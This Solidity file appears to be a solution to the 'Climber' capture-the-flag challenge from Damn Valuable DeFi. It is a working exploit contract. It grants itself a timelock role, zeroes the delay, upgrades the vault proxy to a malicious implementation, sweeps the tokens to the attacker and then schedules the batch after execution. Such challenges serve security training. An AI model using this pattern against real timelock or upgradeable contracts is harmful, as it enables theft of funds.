// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Initializable} from "openzeppelin-contracts-upgradeable/proxy/utils/Initializable.sol";
import {OwnableUpgradeable} from "openzeppelin-contracts-upgradeable/access/OwnableUpgradeable.sol";
import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import "openzeppelin-contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ClimberAttackUpgrade} from "./ClimberAttackUpgrade.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {ClimberTimelock} from "../../../src/Contracts/climber/ClimberTimelock.sol";
import {ClimberVault} from "../../../src/Contracts/climber/ClimberVault.sol";

import "forge-std/Test.sol";

contract ClimberAttack is Test{

    ERC1967Proxy internal immutable climberVaultProxy;
    ClimberTimelock internal immutable climberTimelock;
    DamnValuableToken internal immutable dvt;
    ClimberAttackUpgrade internal immutable newImpl;
    address payable internal attacker;
    address[] internal targets;
    uint256[] internal values;
    bytes[] internal dataElements;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        address payable _attacker,
        ERC1967Proxy _climberVaultProxy,
        ClimberTimelock _climberTimelock,
        DamnValuableToken _dvt,
        ClimberAttackUpgrade _newImpl
    ){
            attacker = _attacker;
            climberVaultProxy = _climberVaultProxy;
            climberTimelock = _climberTimelock;
            dvt = _dvt;
            newImpl = _newImpl;
        }   
    
    function drain() external{
         ClimberAttackUpgrade(address(climberVaultProxy))._setSweeper(address(this));
         ClimberAttackUpgrade(address(climberVaultProxy)).sweepFunds(address(dvt));
         require(dvt.balanceOf(address(this)) >= 10000000000000000000000000, "funds arrived");
         dvt.transfer(attacker,10000000000000000000000000);
         climberTimelock.schedule(
                targets,
                values,
                dataElements,
                "0"
        );

    }
    /**
     * setup proposer role
     * update delay
     * upgrade to new impl
     * schedule for id
     * call new implementation
     * drain
     */
    function attack() external {
        targets = new address[](4);
        targets[0] = address(climberTimelock);
        targets[1] = address(climberTimelock);
        targets[2] = address(climberVaultProxy);
        targets[3] = address(this);

        values = new uint256[](4);

        dataElements = new bytes[](4);
        dataElements[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        dataElements[1] = abi.encodeWithSignature("updateDelay(uint64)",0);
        dataElements[2] = abi.encodeWithSignature("upgradeTo(address)",address(newImpl));
        dataElements[3] = abi.encodeWithSignature("drain()");
        
        climberTimelock.execute(
            targets, // timelock address
            values, // empty
            dataElements, // action data 4 _setupRole() pwn
            "0"
        );
    }
}



